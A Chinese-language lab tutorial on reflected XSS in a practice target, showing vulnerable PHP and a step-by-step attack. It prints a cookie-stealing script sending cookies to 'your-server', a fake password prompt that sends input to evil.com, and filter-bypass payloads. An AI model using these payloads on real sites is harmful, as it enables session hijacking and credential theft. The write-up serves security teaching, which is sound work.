# 反射型 XSS

## 靶场：XSS Easy

### 漏洞描述

搜索框将用户输入直接反射到页面，没有任何过滤或编码：

```php
$keyword = $_GET['keyword'];
echo "<p>搜索结果: $keyword</p>";
```

## 攻击步骤

### 第一步：确认漏洞

访问 `?keyword=test`，页面显示 "搜索结果: test"。

访问 `?keyword=<script>alert('XSS')</script>`，如果弹窗，说明存在 XSS。

### 第二步：获取 Cookie

```javascript
<script>
new Image().src="http://your-server/steal?c="+document.cookie;
</script>
```

### 第三步：构造钓鱼页面

```javascript
<script>
document.body.innerHTML='<h1>系统维护</h1><p>请输入密码继续：</p><input type="password" id="pw"><button onclick="fetch(\'http://evil.com/log?pw=\'+document.getElementById(\'pw\').value)">提交</button>';
</script>
```

## 进阶技巧

### 绕过简单过滤

```javascript
// 大小写混合
<Script>alert('XSS')</Script>

// 双写绕过
<scr<script>ipt>alert('XSS')</scr</script>ipt>

// 事件处理
<img src=x onerror=alert('XSS')>

// SVG
<svg onload=alert('XSS')>
```

### 编码绕过

```javascript
// HTML 实体编码
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">

// Unicode 编码
<script>alert('XSS')</script>

// URL 编码
%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
```

## 关键知识点

- **反射型 XSS** — 恶意脚本通过 URL 参数注入
- **事件处理** — onerror、onload 等事件触发脚本
- **编码绕过** — 使用不同编码绕过过滤

## 下一步

回到 [XSS 分类](../categories) 继续学习其他类型。
